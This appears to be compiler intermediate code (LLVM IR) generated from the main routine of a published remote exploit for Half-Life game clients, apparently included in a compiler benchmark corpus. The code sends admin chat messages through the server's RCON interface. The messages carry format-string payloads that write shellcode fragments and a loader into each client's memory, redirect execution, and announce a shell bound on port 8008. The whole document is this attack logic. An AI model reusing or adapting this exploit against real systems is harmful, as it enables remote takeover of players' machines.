; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_22142.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_22142.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [63 x i8] c"hoagie_adminmod_client - remote exploit for half-life-clients\0A\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"by greuff@void.at\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [62 x i8] c"Usage: %s server_ip server_port rcon_password [player_nick]\0A\0A\00", align 1
@server_ip = common dso_local global i8* null, align 8
@server_port = common dso_local global i32 0, align 4
@rcon_pwd = common dso_local global i8* null, align 8
@player_nick = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [30 x i8] c"admin_command admin_psay \22%s\22\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c"admin_command admin_ssay\00", align 1
@.str.5 = private unnamed_addr constant [52 x i8] c"Sending to ALL clients! You have 3 sec to abort...\0A\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"%s \00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"%%%du%s\00", align 1
@shellcode = common dso_local global i8** null, align 8
@.str.9 = private unnamed_addr constant [44 x i8] c"Writing shellcode fragment at offset %d...\0A\00", align 1
@loader = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [35 x i8] c"Writing bootstrap at offset %d...\0A\00", align 1
@STRADDR = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [47 x i8] c"%s AA%c%c%c%c%c%c%%.f%%.f%%.f%%.f%%.f%%.%du%%n\00", align 1
@.str.12 = private unnamed_addr constant [47 x i8] c"Writing return into shellcode instructions...\0A\00", align 1
@.str.13 = private unnamed_addr constant [53 x i8] c"Shell (hopefully) spawned at client host port 8008.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [1000 x i8], align 16
  %11 = alloca [100 x i8], align 16
  %12 = alloca [100000 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 4
  br i1 %19, label %23, label %20

20:                                               ; preds = %2
  %21 = load i32, i32* %4, align 4
  %22 = icmp sgt i32 %21, 5
  br i1 %22, label %23, label %29

23:                                               ; preds = %20, %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.2, i64 0, i64 0), i8* %26)
  %28 = call i32 @exit(i32 1) #3
  unreachable

29:                                               ; preds = %20
  %30 = load i8*, i8** @server_ip, align 8
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcpy(i8* %30, i8* %33)
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @strtol(i8* %37, i32* null, i32 10)
  store i32 %38, i32* @server_port, align 4
  %39 = load i8*, i8** @rcon_pwd, align 8
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 3
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @strcpy(i8* %39, i8* %42)
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 5
  br i1 %45, label %46, label %55

46:                                               ; preds = %29
  %47 = load i8*, i8** @player_nick, align 8
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 4
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcpy(i8* %47, i8* %50)
  %52 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %53 = load i8*, i8** @player_nick, align 8
  %54 = call i32 (i8*, i8*, ...) @sprintf(i8* %52, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i8* %53)
  br label %60

55:                                               ; preds = %29
  %56 = load i8*, i8** @player_nick, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 0
  store i8 0, i8* %57, align 1
  %58 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %59 = call i32 (i8*, i8*, ...) @sprintf(i8* %58, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0))
  br label %60

60:                                               ; preds = %55, %46
  %61 = load i8*, i8** @player_nick, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 0
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %69

66:                                               ; preds = %60
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.5, i64 0, i64 0))
  %68 = call i32 @sleep(i32 3)
  br label %69

69:                                               ; preds = %66, %60
  %70 = load i8*, i8** @server_ip, align 8
  %71 = load i32, i32* @server_port, align 4
  %72 = call i32 @create_conn(i32* %6, i8* %70, i32 %71)
  store i32 5056, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 21, i32* %7, align 4
  br label %73

73:                                               ; preds = %122, %69
  %74 = load i32, i32* %7, align 4
  %75 = icmp sge i32 %74, 0
  br i1 %75, label %76, label %125

76:                                               ; preds = %73
  %77 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %78 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %79 = call i32 (i8*, i8*, ...) @sprintf(i8* %77, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0), i8* %78)
  store i32 0, i32* %8, align 4
  br label %80

80:                                               ; preds = %87, %76
  %81 = load i32, i32* %8, align 4
  %82 = load i32, i32* %14, align 4
  %83 = icmp ult i32 %81, %82
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %86 = call i32 @strcat(i8* %85, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  br label %87

87:                                               ; preds = %84
  %88 = load i32, i32* %8, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %8, align 4
  br label %80

90:                                               ; preds = %80
  %91 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %92 = load i32, i32* %13, align 4
  %93 = load i8**, i8*** @shellcode, align 8
  %94 = load i32, i32* %7, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8*, i8** %93, i64 %95
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 (i8*, i8*, ...) @sprintf(i8* %91, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i32 %92, i8* %97)
  %99 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %100 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %101 = call i32 @strcat(i8* %99, i8* %100)
  %102 = load i32, i32* %13, align 4
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.9, i64 0, i64 0), i32 %102)
  %104 = load i32, i32* %6, align 4
  %105 = load i8*, i8** @server_ip, align 8
  %106 = load i32, i32* @server_port, align 4
  %107 = load i8*, i8** @rcon_pwd, align 8
  %108 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %109 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %110 = call i32 @send_rcon(i32 %104, i8* %105, i32 %106, i8* %107, i8* %108, i8* %109)
  %111 = load i8**, i8*** @shellcode, align 8
  %112 = load i32, i32* %7, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = call i64 @strlen(i8* %115)
  %117 = add nsw i64 %116, 2
  %118 = load i32, i32* %13, align 4
  %119 = zext i32 %118 to i64
  %120 = sub nsw i64 %119, %117
  %121 = trunc i64 %120 to i32
  store i32 %121, i32* %13, align 4
  br label %122

122:                                              ; preds = %90
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, -1
  store i32 %124, i32* %7, align 4
  br label %73

125:                                              ; preds = %73
  %126 = load i8**, i8*** @shellcode, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 0
  %128 = load i8*, i8** %127, align 8
  %129 = call i64 @strlen(i8* %128)
  %130 = load i32, i32* %13, align 4
  %131 = zext i32 %130 to i64
  %132 = sub nsw i64 %131, %129
  %133 = trunc i64 %132 to i32
  store i32 %133, i32* %13, align 4
  %134 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %135 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %136 = call i32 (i8*, i8*, ...) @sprintf(i8* %134, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0), i8* %135)
  store i32 0, i32* %8, align 4
  br label %137

137:                                              ; preds = %144, %125
  %138 = load i32, i32* %8, align 4
  %139 = load i32, i32* %14, align 4
  %140 = icmp ult i32 %138, %139
  br i1 %140, label %141, label %147

141:                                              ; preds = %137
  %142 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %143 = call i32 @strcat(i8* %142, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  br label %144

144:                                              ; preds = %141
  %145 = load i32, i32* %8, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %8, align 4
  br label %137

147:                                              ; preds = %137
  %148 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %149 = load i32, i32* %13, align 4
  %150 = load i8*, i8** @loader, align 8
  %151 = call i32 (i8*, i8*, ...) @sprintf(i8* %148, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i32 %149, i8* %150)
  %152 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %153 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %154 = call i32 @strcat(i8* %152, i8* %153)
  %155 = load i32, i32* %13, align 4
  %156 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.10, i64 0, i64 0), i32 %155)
  %157 = load i32, i32* %6, align 4
  %158 = load i8*, i8** @server_ip, align 8
  %159 = load i32, i32* @server_port, align 4
  %160 = load i8*, i8** @rcon_pwd, align 8
  %161 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %162 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %163 = call i32 @send_rcon(i32 %157, i8* %158, i32 %159, i8* %160, i8* %161, i8* %162)
  %164 = load i32, i32* @STRADDR, align 4
  %165 = load i32, i32* %13, align 4
  %166 = add i32 %164, %165
  %167 = add i32 %166, 73
  %168 = load i32, i32* %14, align 4
  %169 = add i32 %167, %168
  %170 = zext i32 %169 to i64
  store i64 %170, i64* %15, align 8
  %171 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %172 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %173 = load i64, i64* %15, align 8
  %174 = and i64 %173, 255
  %175 = load i64, i64* %15, align 8
  %176 = lshr i64 %175, 8
  %177 = and i64 %176, 255
  %178 = load i64, i64* %15, align 8
  %179 = lshr i64 %178, 16
  %180 = and i64 %179, 255
  %181 = load i64, i64* %15, align 8
  %182 = lshr i64 %181, 24
  %183 = and i64 %182, 255
  %184 = call i32 (i8*, i8*, ...) @sprintf(i8* %171, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.11, i64 0, i64 0), i8* %172, i32 104, i64 %174, i64 %177, i64 %180, i64 %183, i32 195, i32 734)
  %185 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.12, i64 0, i64 0))
  %186 = load i32, i32* %6, align 4
  %187 = load i8*, i8** @server_ip, align 8
  %188 = load i32, i32* @server_port, align 4
  %189 = load i8*, i8** @rcon_pwd, align 8
  %190 = getelementptr inbounds [100000 x i8], [100000 x i8]* %12, i64 0, i64 0
  %191 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %192 = call i32 @send_rcon(i32 %186, i8* %187, i32 %188, i8* %189, i8* %190, i8* %191)
  %193 = load i32, i32* %6, align 4
  %194 = call i32 @close(i32 %193)
  %195 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.13, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strtol(i8*, i32*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @create_conn(i32*, i8*, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send_rcon(i32, i8*, i32, i8*, i8*, i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
